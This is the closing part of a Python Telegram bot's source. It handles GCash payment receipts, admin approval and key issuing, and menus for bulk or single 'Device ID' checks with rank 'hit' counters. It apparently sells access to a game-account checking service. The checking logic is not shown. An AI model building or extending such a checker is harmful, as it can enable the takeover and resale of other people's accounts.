
    plan       = GCASH_PLANS.get(plan_key, {})
    plan_label = plan.get("label", "Unknown")
    plan_price = plan.get("price", "?")
    username   = update.effective_user.username or update.effective_user.first_name or str(uid)

    with job_lock:
        active_jobs.get(uid, {}).pop("awaiting_receipt", None)
        if not active_jobs.get(uid): active_jobs.pop(uid, None)

    await update.message.reply_text(
        f"✅ *Receipt received!*\nPlan: {plan_label} ({plan_price})\nForwarded to admin.",
        parse_mode="Markdown"
    )

    caption = (
        f"💳 *NEW PAYMENT REQUEST!*\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Buyer: @{username} (`{uid}`)\n"
        f"Plan: {plan_label} — {plan_price}\n"
        f"━━━━━━━━━━━━━━━━━━━━\nApprove or deny:"
    )
    photo = update.message.photo[-1]
    try:
        await ctx.bot.send_photo(
            chat_id=OWNER_ID, photo=photo.file_id,
            caption=caption, parse_mode="Markdown",
            reply_markup=kb_gcash_admin(str(uid), plan_key)
        )
    except Exception as e:
        log.error(f"Receipt forward failed: {e}")

# ────────────────────────────────────────────────────────────────
# CALLBACK HANDLER
# ────────────────────────────────────────────────────────────────

async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try: await query.answer()
    except BadRequest as e:
        if "Query is too old" not in str(e) and "query id is invalid" not in str(e): raise

    data = query.data
    uid  = update.effective_user.id

    if data == "tool_bulk":
        auth, reason = await user_manager.is_authorized(uid)
        if not auth:
            await query.edit_message_text(f"🚫 Access denied: `{reason}`", parse_mode="Markdown"); return
        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await query.edit_message_text("⚠️ Active job. Use /stop first."); return
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_bulk_file"] = True
        await query.edit_message_text(
            "📤 *Bulk Check Mode (10 Threads)*\nSend a `.txt` file with one Device ID per line.\n\n"
            "Results are returned as JSON.",
            parse_mode="Markdown"
        ); return

    if data == "tool_single":
        auth, reason = await user_manager.is_authorized(uid)
        if not auth:
            await query.edit_message_text(f"🚫 Access denied: `{reason}`", parse_mode="Markdown"); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_single_device"] = True
        await query.edit_message_text(
            "🔍 *Single Account Check*\nSend the Device ID as a text message.\n\n"
            "Result is returned as JSON.",
            parse_mode="Markdown"
        ); return

    if data == "tool_stats":
        with COUNTER_LOCK:
            lines = [f"📊 *Live Rank Hit Counters*\n━━━━━━━━━━━━━━━━━━━━"]
            for r in ['warrior','elite','master','gm','epic','legend','mythic']:
                lines.append(f"┣ {r.capitalize():<12}: `{HIT_COUNTERS.get(r,0)}`")
            lines.append("━━━━━━━━━━━━━━━━━━━━")
            lines.append(f"┣ V2L Active  : `{HIT_COUNTERS.get('v2l_active',0)}`")
            lines.append(f"┣ V2L Inactive: `{HIT_COUNTERS.get('v2l_inactive',0)}`")
            lines.append(f"┣ Sultan      : `{HIT_COUNTERS.get('sultan',0)}`")
            lines.append(f"┗ Banned      : `{HIT_COUNTERS.get('banned',0)}`")
        await query.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

    if data == "menu_buy":
        await query.edit_message_text(
            f"💳 *GET ACCESS KEY*\n━━━━━━━━━━━━━━━━━━━━\n"
            f"💎 *PLANS*\n▸  3 Days      ₱50\n▸  7 Days      ₱70\n"
            f"▸  1 Month     ₱100\n◆  Lifetime    ₱150\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Tap a plan below to see payment steps.",
            parse_mode="Markdown", reply_markup=kb_gcash_plans()
        ); return

    if data == "menu_help":
        await query.edit_message_text(
            f"📖 *{BOT_NAME} Help*\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 Bulk Check – send `.txt` file (10 threads)\n"
            f"🔍 Single Check – type one Device ID\n"
            f"📊 Live Statistics – rank hit counters\n\n"
            f"All results returned as JSON.\n\n"
            f"/redeem <key> · /stop · /start",
            parse_mode="Markdown"
        ); return

    if data.startswith("gcash_sel:"):
        plan_key = data.split(":", 1)[1]
        plan     = GCASH_PLANS.get(plan_key)
        if not plan:
            await query.answer("Unknown plan.", show_alert=True); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_receipt"] = plan_key
        await query.edit_message_text(
            f"💳 *PAYMENT STEPS*\nPlan: {plan['label']}  ·  Amount: {plan['price']}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n1. Open GCash\n2. Send to admin\n"
            f"3. Amount: {plan['price']}\n4. Screenshot receipt\n"
            f"5. Send the photo here\n━━━━━━━━━━━━━━━━━━━━\nAdmin will approve shortly.",
            parse_mode="Markdown"
        ); return

    if data.startswith("gcash_approve:"):
        if uid != OWNER_ID:
            await query.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan = GCASH_PLANS.get(plan_key, {})
        keys, _ = await user_manager.generate_key(plan.get("dval", 1), plan.get("dtype", "days"), 1, 1)
        key = keys[0] if keys else "ERROR"
        users = await user_manager.get_all_users()
        if buyer_uid not in users:
            await ctx.bot.send_message(chat_id=OWNER_ID, text=f"❌ User {buyer_uid} not found.")
            await query.answer("User not found.", show_alert=True); return
        users[buyer_uid]["key_expiry"] = user_manager.keys["keys"][key]["expiry"]
        await user_manager._save_users()

        txn = get_next_txn_number()
        dur_display = plan.get('label', plan_key)
        await query.answer("✅ Approved!", show_alert=False)

        try:
            await ctx.bot.send_message(
                chat_id=OWNER_ID,
                text=f"✅ *APPROVED — #{txn}*\n━━━━━━━━━━━━━━━━━━━━\nPlan   : `{dur_display}`\nKey    : `{key}`\nBuyer  : `{buyer_uid}`\n━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown"
            )
        except: pass

        for attempt in range(3):
            try:
                await ctx.bot.send_message(
                    chat_id=int(buyer_uid),
                    text=f"✅ *PAYMENT APPROVED — #{txn}*\n━━━━━━━━━━━━━━━━━━━━\nPlan   : `{dur_display}`\n🔑 Key : `{key}`\n━━━━━━━━━━━━━━━━━━━━\nUse `/redeem {key}` or tap /start.",
                    parse_mode="Markdown"
                )
                break
            except Exception as e:
                log.error(f"Approval notify {attempt+1}: {e}")
                await asyncio.sleep(1)
        return

    if data.startswith("gcash_deny:"):
        if uid != OWNER_ID:
            await query.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan        = GCASH_PLANS.get(plan_key, {})
        dur_display = plan.get('label', 'Unknown')
        txn         = get_next_txn_number()
        await query.answer("❌ Denied.", show_alert=False)
        for attempt in range(3):
            try:
                await ctx.bot.send_message(
                    chat_id=int(buyer_uid),
                    text=f"❌ *PAYMENT DENIED — #{txn}*\n━━━━━━━━━━━━━━━━━━━━\nPlan   : `{dur_display}`\nPayment could not be verified.",
                    parse_mode="Markdown"
                )
                break
            except Exception as e:
                log.error(f"Denial notify {attempt+1}: {e}")
                await asyncio.sleep(1)
        return

    if data.startswith("stop_"):
        target = int(data.split("_")[1])
        if uid == target or uid == OWNER_ID:
            with job_lock:
                if target in active_jobs:
                    active_jobs[target]["stopped"] = True
            await query.edit_message_text("🛑 Job stopped.")
        else:
            await query.answer("Not your job!", show_alert=True)
        return

    if data == "open_admin_panel":
        if uid != OWNER_ID:
            await query.answer("Admin only.", show_alert=True); return
        await query.edit_message_text("👑 *Admin Panel*", reply_markup=kb_admin_main(), parse_mode="Markdown"); return

    if data.startswith("adm_"):
        if uid != OWNER_ID:
            await query.answer("Admin only.", show_alert=True); return

        if data == "adm_refresh":
            users = await user_manager.get_all_users()
            ac    = sum(1 for u in users.values() if u.get("key_expiry"))
            bc    = sum(1 for u in users.values() if u.get("banned"))
            await query.edit_message_text(
                f"👑 *ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━\n"
                f"Users `{len(users)}` · Active `{ac}` · Banned `{bc}`\n"
                f"━━━━━━━━━━━━━━━━━━━━",
                reply_markup=kb_admin_main(), parse_mode="Markdown"
            )
            await query.answer("Refreshed!"); return

        if data == "adm_stats":
            users = await user_manager.get_all_users()
            with COUNTER_LOCK:
                rank_stats = "\n".join(
                    f"┣ {r.capitalize():<12}: `{HIT_COUNTERS.get(r,0)}`"
                    for r in ['warrior','elite','master','gm','epic','legend','mythic']
                )
            await query.edit_message_text(
                f"📊 *Bot Statistics*\n━━━━━━━━━━━━━━━━━━━━\n"
                f"Users: `{len(users)}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n*Rank Hits:*\n{rank_stats}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"V2L Active   : `{HIT_COUNTERS.get('v2l_active',0)}`\n"
                f"V2L Inactive : `{HIT_COUNTERS.get('v2l_inactive',0)}`\n"
                f"Sultan       : `{HIT_COUNTERS.get('sultan',0)}`\n"
                f"Banned       : `{HIT_COUNTERS.get('banned',0)}`",
                parse_mode="Markdown"
            ); return

        if data == "adm_running":
            with job_lock:
                running = [(k, v) for k, v in active_jobs.items()
                           if v.get("status") == "running"]
            if not running:
                await query.edit_message_text("No active sessions.", parse_mode="Markdown"); return
            lines = [f"*Running Sessions ({len(running)})*\n━━━━━━━━━━━━━━━━━━━━"]
            for ruid, rjob in running:
                lines.append(f"• `{ruid}` — {rjob.get('checked',0)}/{rjob.get('total',0)}")
            await query.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

        if data == "adm_genkey":
            await query.edit_message_text(
                "🔑 *Generate Key*\nUse:\n`/genkey hours 24 1`\n`/genkey days 7 1`\n"
                "`/genkey months 1 1`\n`/genkey lifetime 1`",
                parse_mode="Markdown"
            ); return

        if data == "adm_users":
            users = await user_manager.get_all_users()
            if not users:
                await query.edit_message_text("No users.", parse_mode="Markdown"); return
            lines = ["👥 *All Users*\n━━━━━━━━━━━━━━━━━━━━"]
            for u_id, info in list(users.items())[:30]:
                status = "🚫" if info.get("banned") else "✅"
                exp    = (info.get("key_expiry") or "No key")[:10]
                lines.append(f"`{u_id}` {status} | {exp}")
            await query.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

        await query.edit_message_text("Unknown admin action.", parse_mode="Markdown"); return

    await query.edit_message_text("Unknown action.", parse_mode="Markdown")

# ────────────────────────────────────────────────────────────────
# POST INIT + MAIN
# ────────────────────────────────────────────────────────────────

async def post_init(app: Application) -> None:
    user_cmds = [
        BotCommand("start",  "Open dashboard"),
        BotCommand("redeem", "Redeem a key"),
        BotCommand("stop",   "Stop current job"),
        BotCommand("status", "Job status"),
        BotCommand("help",   "Help"),
    ]
    await app.bot.set_my_commands(user_cmds)
    if OWNER_ID:
        await app.bot.set_my_commands(user_cmds + [
            BotCommand("admin",      "Admin panel"),
            BotCommand("genkey",     "Generate key"),
            BotCommand("remove_key", "Remove user key"),
            BotCommand("ban_user",   "Ban user"),
            BotCommand("unban_user", "Unban user"),
            BotCommand("stats",      "Bot statistics"),
            BotCommand("broadcast",  "Broadcast message"),
        ], scope={"type": "chat", "chat_id": OWNER_ID})
    log.info(f"🚀 {BOT_NAME} v{BOT_VERSION} online — 10 threads fixed")

def main():
    http_request = HTTPXRequest(
        connect_timeout=TELEGRAM_CONNECT_TIMEOUT,
        read_timeout=TELEGRAM_READ_TIMEOUT,
        write_timeout=TELEGRAM_WRITE_TIMEOUT,
        pool_timeout=TELEGRAM_POOL_TIMEOUT,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(http_request)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start",      cmd_start))
    app.add_handler(CommandHandler("redeem",     cmd_redeem))
    app.add_handler(CommandHandler("help",       cmd_help))
    app.add_handler(CommandHandler("stop",       cmd_stop))
    app.add_handler(CommandHandler("status",     cmd_status))
    app.add_handler(CommandHandler("admin",      cmd_admin))
    app.add_handler(CommandHandler("genkey",     cmd_genkey))
    app.add_handler(CommandHandler("remove_key", cmd_remove_key))
    app.add_handler(CommandHandler("ban_user",   cmd_ban_user))
    app.add_handler(CommandHandler("unban_user", cmd_unban_user))
    app.add_handler(CommandHandler("stats",      cmd_stats))
    app.add_handler(CommandHandler("broadcast",  cmd_broadcast))

    app.add_handler(MessageHandler(filters.Document.ALL,            handle_document))
    app.add_handler(MessageHandler(filters.PHOTO,                   on_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(handle_callback))

    log.info(f"🔥 {BOT_NAME} v{BOT_VERSION} starting...")
    try:
        app.run_polling(
            bootstrap_retries=10,
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=False,
        )
    except NetworkError as e:
        log.error(f"Network error: {e}. Retrying in 5s...")
        time.sleep(5)
        main()
    except Exception as e:
        log.error(f"Fatal: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()